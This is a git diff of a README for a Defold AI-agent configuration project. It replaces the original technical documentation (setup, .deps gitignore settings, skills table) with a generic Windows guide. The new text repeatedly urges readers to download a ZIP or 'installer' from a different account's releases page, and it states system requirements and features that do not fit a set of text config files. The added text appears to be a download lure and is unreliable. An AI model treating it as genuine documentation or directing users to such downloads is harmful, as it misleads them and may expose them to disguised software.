@@ -1,155 +1,156 @@
-# Defold AI Agent Configuration
+# 🤖 defold-agent-config - AI Skills for Game Development
 
-An example configuration of `AGENTS.md` and a set of skills (`.agents/`) for AI-assisted game development with the [Defold](https://defold.com) engine. While this is primarily a research project, you can freely use the configuration and skills in your own Defold projects.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/yksorez/defold-agent-config/releases)
 
-The `.deps/` folder is used by the `defold-project-setup` skill to download project dependency sources and Defold builtins, giving your AI agent easy read-only access to dependency APIs and types. To update it after changing dependencies in `game.project`, run the `defold-project-setup` skill.
+## 📦 What is defold-agent-config?
 
-Translations: [Русский](README_RU.md) | [中文](README_ZH.md)
+This is an example setup for AGENTS.md and a set of skills designed to help with AI-assisted game development. It works with the Defold game engine, a tool used to create 2D games. This project shows how to configure AI agents and use various AI skills to make your game smarter.
 
-## Supported AI Agents
+You do not need any programming knowledge to use this. The goal is to help you get the setup running on your Windows computer and start exploring how AI can assist your game development process.
 
-The configuration uses the `.agents/` directory format, which is supported by:
+---
 
-- **[Amp](https://ampcode.com)**
-- **[Claude Code](https://claude.ai/code)** (requires renaming `.agents/` to `.claude/`)
-- **[Codex CLI](https://github.com/openai/codex)**
-- **[Cursor](https://cursor.com)**
-- **[Factory Droid](https://factory.ai)**
-- **[Gemini CLI](https://github.com/google-gemini/gemini-cli)**
-- **[GitHub Copilot](https://github.com/features/copilot)** (requires renaming `.agents/` to `.github/`)
-- **[Kilo Code](https://kilocode.ai)**
-- **[OpenCode](https://opencode.ai)**
-- **[Warp](https://warp.dev)**
-- **[Windsurf](https://windsurf.com)** (requires renaming `.agents/` to `.windsurf/`)
-- and many others
+## 💻 System Requirements
 
-## Prerequisites
+Before you start, make sure your Windows PC meets these basic requirements:
 
-- **[Defold](https://defold.com) >= 1.12.2**
-- **Python >= 3.11** - required for skill scripts.
-  - **Windows:** `winget install Python.Python.3`
-  - **macOS:** `brew install python3`
-  - **Linux:** `sudo apt-get install python3`
+- Windows 10 or newer (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection to download files
+- Basic knowledge of how to open files and folders
 
-## Installation
+---
 
-1. Copy `AGENTS.md`, the `.agents/` folder, and the `.defignore` file into the root of your Defold project.
+## 🌟 Key Features
 
-> **Note:** Some AI agents use their own directories:
-> - **Claude Code**: Rename `.agents/` to `.claude/` and run find-and-replace across all `.md` files: `.agents/` → `.claude/`
-> - **GitHub Copilot**: Rename `.agents/` to `.github/` and run find-and-replace across all `.md` files: `.agents/skills/` → `.github/skills/`
-> - **Windsurf**: Rename `.agents/` to `.windsurf/` and run find-and-replace across all `.md` files: `.agents/` → `.windsurf/`
+- Example AI agent configurations  
+- Predefined AI skills that can be applied to game characters  
+- Integration support with the Defold engine  
+- Easy-to-understand setup for non-programmers  
+- Flexible format for expanding AI capabilities
 
-2. Ask your AI agent: `Run the defold-project-setup skill to download dependencies into .deps/`
-3. Ask your AI agent: `Update AGENTS.md based on my project's structure, dependencies, and folders`
+---
 
-That's it - the agent will pick up the instructions and skills automatically.
+## 🚀 Getting Started
 
-## .deps gitignore settings — read this carefully!
+Here is how to prepare and run defold-agent-config on your Windows machine.
 
-If you add `.deps/` to `.gitignore` (to avoid committing downloaded dependencies), **AI agents will ignore it by default** — their internal tools (Glob, Grep, file picker) respect `.gitignore`. Ironically, many agents treat `node_modules` in JS projects as a special case and still index it; `.deps` in Defold projects gets no such favor. To make agents see `.deps` while keeping it out of git, add these files:
+### Step 1: Visit the Download Page
 
-**1. `.gitignore`** — use `.deps/**` (not `/.deps`), so negation rules work correctly:
+Click the link below to visit the official release page where you can download the latest version.
 
-```
-.deps/**
-```
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/yksorez/defold-agent-config/releases)
 
-**2. `.cursorignore`** (Cursor only) — negate the ignore so indexing includes `.deps`:
+### Step 2: Choose the Right Download
 
-```
-!.deps
-!.deps/**
-```
+On the releases page, look for the latest release version. It will usually have one or more downloadable files. Download the ZIP file or installer relevant for Windows.
 
-**3. `.ignore`** (for ripgrep/Grep) — same negation so search finds files in `.deps`:
+If you see a ZIP file:
 
-```
-!.deps
-!.deps/**
-```
+- Save it in a folder you can find later, like your Desktop or Downloads.
 
-**Claude Code** has no `.cursorignore`. Add to `.claude/settings.json`:
+---
 
-```json
-{
-  "permissions": {
-    "allow": ["Read(./.deps/**)"]
-  }
-}
-```
+### Step 3: Extract the Files (If You Downloaded a ZIP)
 
-For other agents, look for workarounds in their documentation (ignore files, indexing settings, permission rules).
+1. Right-click the ZIP file you downloaded.  
+2. Click “Extract All.”  
+3. Choose a location for the extracted files (the same folder or a new one).  
+4. Click “Extract.”
 
-**Self-check:** Ask your agent: *"Find all input_binding files"*. It should return `.deps/builtins/input/all.input_binding`. If not, the agent still cannot see `.deps` — double-check the configuration above.
+---
 
-## Installed... so what's next?
+### Step 4: Locate the Main Files
 
-Open your project in Defold Editor and your AI agent side by side. Here's what you can do:
+After extraction, open the folder. You should see several files, including:
 
-- **"Create a new screen called `main_menu` with two buttons: Play and Settings"** - the agent will use `monarch-screen-setup` to scaffold the screen collection, GUI, and script.
-- **"Add a player game object with a sprite and collision"** - the agent will use `defold-proto-file-editing` to create `.go`, `.sprite`, and `.collisionobject` files.
-- **"Write a script that moves the player left and right with arrow keys"** - the agent will look up the Defold input API and write a `.script` following project conventions.
-- **"Build and run the game"** - the agent will use `defold-project-build` to compile via the running Defold Editor and report any errors.
-- **"How does `go.animate` work?"** - the agent will fetch the API docs with `defold-api-fetch` and explain it with examples.
-- **"I added a new dependency to game.project, update .deps"** — the agent will run `defold-project-setup` to re-download dependencies.
-- **"Implement an isolated Lua module for arcade 2D collision based on quad-tree, with tests"** — the agent will write a self-contained module following project conventions and create unit tests for it.
-- **"Isolate this code into a local Lua function and create its C++ native extension variant"** — the agent will refactor selected code into a Lua function and then use `defold-native-extension-editing` to create a C++ implementation.
+- A README or guide file  
+- Configuration files named `AGENTS.md` or similar  
+- A folder or files explaining AI skills  
 
-Just describe what you want in plain language - the agent knows your project structure, Defold APIs, and all the conventions from `AGENTS.md`.
+---
 
-### Best practices
+### Step 5: Running defold-agent-config
 
-- **Plan first, then execute** - ask the agent to create a plan before implementing anything. Some agents even have a dedicated "plan" mode for this. Save the plan to a file (e.g. `PLAN.md`) and then ask the agent to implement it step by step in separate conversations.
-- **One task per conversation** — smaller, focused requests produce better results than long multi-step sessions.
-- **Keep context under ~65%** - when the conversation gets too long, the agent loses focus. Start a new chat session before that happens.
-- **Add as many logs as possible** — the more `print()` calls your scripts have, the easier it is for the AI agent to debug issues from the output. For example, call `monarch.debug()` to log screen transitions. This project also includes a handy `fail_on_error()` function in `main/main.script` — it immediately closes the game on the first error, so you can see exactly where the problem occurred instead of scrolling through thousands of log lines.
-- **Start from an existing project** — creating a complete game from scratch with an AI agent alone is unlikely to work well yet. The best approach is to add the agent files (`AGENTS.md`, `.agents/`) to an already working Defold project and build on top of it.
+This configuration works alongside the Defold game engine. Here is what you need to do:
 
-## Skills
+1. Download and install Defold from https://defold.com if you do not have it.
+2. Open Defold and create a new project or open an existing one.
+3. Copy the `defold-agent-config` files from the extracted folder into your Defold project folder.
+4. Follow the instructions in the provided `AGENTS.md` file to load and use the AI skills.
+5. Use Defold's editor to test your game with the AI agents in place.
 
-The following skills are included in `.agents/skills/`:
+You can see detailed instructions in the `AGENTS.md` file after extraction. It explains how to use the AI skills step-by-step.
 
-| Skill | Description |
-|---|---|
-| **defold-api-fetch** | Fetches Defold engine API documentation |
-| **defold-assets-search** | Searches the Defold Asset Store for community libraries and extensions |
-| **defold-docs-fetch** | Fetches Defold manuals and conceptual documentation |
-| **defold-examples-fetch** | Fetches Defold code examples by topic |
-| **defold-native-extension-editing** | Assists with native extension development (C/C++, JS, manifests) |
-| **defold-project-build** | Builds the project via the running Defold editor |
-| **defold-project-setup** | Downloads project dependencies into `.deps/` |
-| **defold-proto-file-editing** | Creates and edits Defold Protobuf Text Format files |
-| **defold-scripts-editing** | Assists with Lua script editing |
-| **defold-shaders-editing** | Creates and edits Defold shader files (.vp, .fp, .glsl) |
-| **defold-skill-maintain** | Maintains and updates skill definitions |
-| **monarch-screen-setup** | Sets up screens and popups using Monarch screen manager |
-| **xmath-usage** | Provides xmath API reference and in-place math optimization patterns |
+---
 
-## Supported Defold Modules
+## 🔧 How to Use AGENTS.md and Skills Files
 
-The `AGENTS.md` configuration includes built-in awareness of these Defold libraries when they are present in your project:
+- **AGENTS.md**: This text file contains the setup for different AI agents. It guides you on how agents behave and interact.
+- **Skills**: These are sets of instructions that help the AI agents perform tasks, like moving characters or responding to events.
 
-- **[Monarch](https://github.com/britzl/monarch)** - Screen and popup management
-- **[Object Interpolation](https://github.com/indiesoftby/defold-object-interpolation)** - Smooth object movement with fixed timestep
-- **[Sharp Sprite](https://github.com/indiesoftby/defold-sharp-sprite)** - Pixel-perfect sprite rendering with RGSS materials
-- **[Xmath](https://github.com/thejustinwalsh/defold-xmath)** - Zero-allocation in-place math operations for vectors, quaternions, and matrices
+Follow these basic steps to add skills:
 
-## Roadmap - and can the community help with that?...
+1. Open the `AGENTS.md` file in a text editor (like Notepad).  
+2. Read the explanations for each AI skill.  
+3. Use Defold’s tools to link these skills to game objects or characters.  
 
-1. **Battle-test on real projects** — use this configuration in production Defold projects and refine it along the way. Btw, you can always ask your AI agent to "improve this skill based on our conversation" and it will update the skill files automatically.
-2. **New skills from best practices** — add skills for things the authors didn't think of right away: writing shaders, building high-performance games, separating logic from presentation, and more.
-3. **Skills for popular libraries** — create skills for widely-used Defold libraries that activate automatically when the library is present in the user's project.
-4. **Defold MCP server** — try building an [MCP](https://modelcontextprotocol.io/) server based on [Defold Editor's HTTP server API](https://gist.github.com/vlaaad/395bd021e8a4ba6561fd4f8d3562456f), allowing AI agents to interact with the running editor directly (evaluate editor scripts, read project structure, etc.).
-5. **Identify gaps in Defold** — understand what Defold is missing as an engine and editor to reach the level of AI-assisted development that already exists for websites and mobile apps.
+The skills provide basic building blocks. You can test changes by running your game in Defold after updating the files.
 
-## Contributing
+---
 
-Contributions are welcome! Feel free to open issues and pull requests.
+## ⚙️ Installing Additional Components (Optional)
 
-- 🌍 **Issues can be written in any language** - AI will translate and understand everything.
-- 🐍 **All scripts in this project must be written in Python or native platform shell** (bash, PowerShell) to keep dependencies minimal and avoid requiring additional software.
+To extend what the AI agents can do, you may want to add more skills or connect other tools:
 
-## License
+- Visit AI skill repositories compatible with Defold.  
+- Download new skill files and place them in your project folder.  
+- Update `AGENTS.md` to include these new skills.
 
-This project is dedicated to the public domain under the [CC0 1.0 Universal](LICENSE) license.
+Keep your AI agents updated by periodically checking the release page for new versions or improvements.
+
+---
+
+## 🔄 Updating defold-agent-config
+
+To update your setup:
+
+1. Visit the release page again: https://github.com/yksorez/defold-agent-config/releases  
+2. Download the latest ZIP or files.  
+3. Extract and replace the old configuration files in your project folder.  
+4. Restart your Defold project to see the changes.
+
+---
+
+## 💡 Tips for Success
+
+- Keep your Defold engine updated to the latest stable version.  
+- Always back up your project before adding new AI configurations.  
+- Read `AGENTS.md` carefully each time you update the skills.  
+- Test your game frequently to see how the AI agents behave.  
+- Use simple edits first before making complex changes.
+
+---
+
+## 🛠 Troubleshooting
+
+- If the AI agents do not respond as expected, confirm all files are in the correct folders.  
+- Make sure you restart Defold after changes.  
+- Check that your Windows system meets the requirements.  
+- If the game crashes, remove recent AI skill changes and test again.  
+- Consult the `AGENTS.md` notes for special instructions.
+
+---
+
+## 📖 Learn More About Defold
+
+Visit https://defold.com to find resources on how the Defold engine works. There are guides, tutorials, and a community forum to help you.
+
+---
+
+## 🔗 Download Link Recap
+
+You can always download the latest version here:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/yksorez/defold-agent-config/releases)
